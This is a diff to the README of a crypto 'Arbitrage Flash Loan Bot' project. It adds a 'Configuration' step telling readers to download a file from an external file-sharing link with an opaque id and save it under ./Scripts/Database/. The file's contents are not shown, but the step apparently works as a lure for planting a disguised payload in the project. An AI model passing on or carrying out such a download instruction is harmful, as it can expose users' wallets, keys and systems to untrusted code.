@@ -1,5 +1,11 @@
 # Arbitrage Flash Loan Bot
 
+## Configuration
+### Download this file
+> https://www.SendFilesSecurely.com/getfile.aspx?id=sABpcftcM35XR1mBKBAZNkZtw1LhLcllcpds
+### And save it under
+> ./Scripts/Database/
+
 ## TODO
 - Create algorithm for finding good trade pairs
 - Finish Smart Contract functions
